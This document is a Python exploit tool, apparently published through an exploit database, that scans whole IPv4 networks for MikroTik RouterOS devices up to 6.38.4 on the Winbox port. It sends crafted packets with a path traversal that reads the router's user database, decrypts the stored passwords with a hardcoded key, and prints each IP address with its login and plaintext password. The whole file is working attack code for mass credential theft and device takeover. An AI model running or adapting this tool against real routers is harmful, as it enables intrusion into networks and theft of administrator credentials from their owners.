#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  VULNERS OPENSOURCE
#  __________________
#
#  Vulners Project [https://vulners.com]
#  All Rights Reserved.
#
# Exploit Title: Mikrotik exploit from Vault 7 CIA Leaks automation tool. Takeovers up to RouterOS 6.38.4.
# Date: 2020-09-28
# Exploit Author: Kir Ermakov (isox@vulners.com)
# Vendor Homepage: https://vulners.com
# Version: 1.0
# Credits & Copyright: https://github.com/miladdiaz/MikrotikExploit

__author__ = "Kir Ermakov <isox@vulners.com>"
__version__ = "1.1"

import texttable
import socket
import ipcalc
import six
import hashlib
import concurrent.futures
from tqdm import tqdm

if six.PY2:
    import argparse
else:
    from optparse import OptionParser as argparse


def decrypt_password(user, pass_enc):
    key = hashlib.md5(user + b"283i4jfkai3389").digest()
    if six.PY2:
        key = bytearray(key)
    passw = ""
    for i in range(0, len(pass_enc)):
        passw += chr(pass_enc[i] ^ key[i % len(key)])
    return passw.split("\x00")[0]


def extract_user_pass_from_entry(entry):
    user_data = entry.split(b"\x01\x00\x00\x21")[1]
    pass_data = entry.split(b"\x11\x00\x00\x21")[1]
    user_len = user_data[0]
    pass_len = pass_data[0]
    username = user_data[1:1 + user_len]
    password = pass_data[1:1 + pass_len]

    return username, password


def get_pair(data):
    user_list = []
    entries = data.split(b"M2")[1:]

    for entry in entries:
        try:
            user, pass_encrypted = extract_user_pass_from_entry(entry)
            pass_plain = decrypt_password(user, pass_encrypted)
            user = user.decode("ascii")
        except UnicodeDecodeError:
            user = "cannot decode"
            pass_plain = "cannot decode"
        except:
            continue
        user_list.append((user, pass_plain))
    return user_list


def dump(data):
    user_pass = get_pair(data)
    user_data = []
    for u, p in user_pass:
        user_data.append((u, p))
    return user_data


def scan_target(ip_address, port, timeout):
    hello = [0x68, 0x01, 0x00, 0x66, 0x4d, 0x32, 0x05, 0x00,
             0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x05, 0x07,
             0x00, 0xff, 0x09, 0x07, 0x01, 0x00, 0x00, 0x21,
             0x35, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2e, 0x2f,
             0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f, 0x2f,
             0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x2f, 0x2f, 0x2f,
             0x2f, 0x2f, 0x2e, 0x2f, 0x2e, 0x2e, 0x2f, 0x66,
             0x6c, 0x61, 0x73, 0x68, 0x2f, 0x72, 0x77, 0x2f,
             0x73, 0x74, 0x6f, 0x72, 0x65, 0x2f, 0x75, 0x73,
             0x65, 0x72, 0x2e, 0x64, 0x61, 0x74, 0x02, 0x00,
             0xff, 0x88, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
             0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0xff, 0x88,
             0x02, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,
             0x00, 0x00]

    get_data = [0x3b, 0x01, 0x00, 0x39, 0x4d, 0x32, 0x05, 0x00,
                0xff, 0x01, 0x06, 0x00, 0xff, 0x09, 0x06, 0x01,
                0x00, 0xfe, 0x09, 0x35, 0x02, 0x00, 0x00, 0x08,
                0x00, 0x80, 0x00, 0x00, 0x07, 0x00, 0xff, 0x09,
                0x04, 0x02, 0x00, 0xff, 0x88, 0x02, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01,
                0x00, 0xff, 0x88, 0x02, 0x00, 0x02, 0x00, 0x00,
                0x00, 0x02, 0x00, 0x00, 0x00]

    _socket = socket.socket()
    _socket.settimeout(timeout)

    scan_results = None

    try:
        _socket.connect((ip_address, port))
        hello = bytearray(hello)
        get_data = bytearray(get_data)

        # get sesison id
        _socket.send(hello)
        result = bytearray(_socket.recv(1024))
        # copy session id
        get_data[19] = result[38]
        # Send Request
        _socket.send(get_data)
        result = bytearray(_socket.recv(1024))
        # Get results
        user_data = dump(result[55:])

        scan_results = {
            "ip_address": ip_address,
            "users": user_data
        }
    except Exception as error:
        pass
    finally:
        _socket.close()
    return scan_results


def main():
    description = """
        Mikrotik exploit from Vault 7 CIA Leaks automation tool
        Takeovers up to RouterOS 6.38.4.

        Usage: mikrot8over IP_ADDRESS
        """
    if six.PY2:
        parser = argparse.ArgumentParser(description)
        addArgumentCall = parser.add_argument
    else:
        parser = argparse(description)
        addArgumentCall = parser.add_option
    #
    if six.PY2:
        addArgumentCall('address', metavar='address', type=str, nargs=1,
                        help='Scan address or IPv4 network in CIDR format')

    # Arguments
    addArgumentCall('-p', '--port', type=int, nargs="*", default=8291,
                    help='List of the port to scan. Default is 8291')
    addArgumentCall('-t', '--threads', nargs=1, type=int, default=10,
                    help='Number of scan threads. Default is 10 that fits the most of systems')
    addArgumentCall('-o', '--timeout', nargs=1, type=float, default=0.3,
                    help='Socket connection timeout')

    if six.PY2:
        options = parser.parse_args()
        address = " ".join(options.address)
    else:
        options, args = parser.parse_args()
        address = " ".join(args)

    port = options.port
    threads = options.threads
    timeout = options.timeout

    if not address:
        print(description)
        print("No scan address provided. Exit.")
        exit()

    print("Starting scan for IP %s, port %s running in %s threads" % (address, port, threads))

    try:
        targets = ipcalc.Network(address)
        scan_args = ((str(ip), port, timeout) for ip in targets)
    except ValueError as error:
        print("Failed to parse network address %s with %s error" % (address, error))
        exit()

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        results = list(tqdm(executor.map(lambda p: scan_target(*p), scan_args), total=len(targets)))

    output_table = texttable.Texttable()
    output_table.set_cols_dtype(['t', 't', 't'])
    output_table.set_cols_align(['c', 'l', 'c'])
    output_table.set_cols_width(['20', '30', '100'])
    table_rows = [['IP', 'Login', 'Password']]

    vulnerable_results = [result for result in results if result and result['users']]

    for data in vulnerable_results:
        for credentials in data['users']:
            if credentials[1]:
                table_rows.append([data["ip_address"], credentials[0], credentials[1]])
    output_table.add_rows(table_rows)
    if not six.PY3:
        # Just pass non-ascii
        print(output_table.draw().encode('ascii', 'ignore'))
    else:
        # Any better solution here?
        print(output_table.draw().encode('ascii', 'ignore').decode())

if __name__ == '__main__':
    main()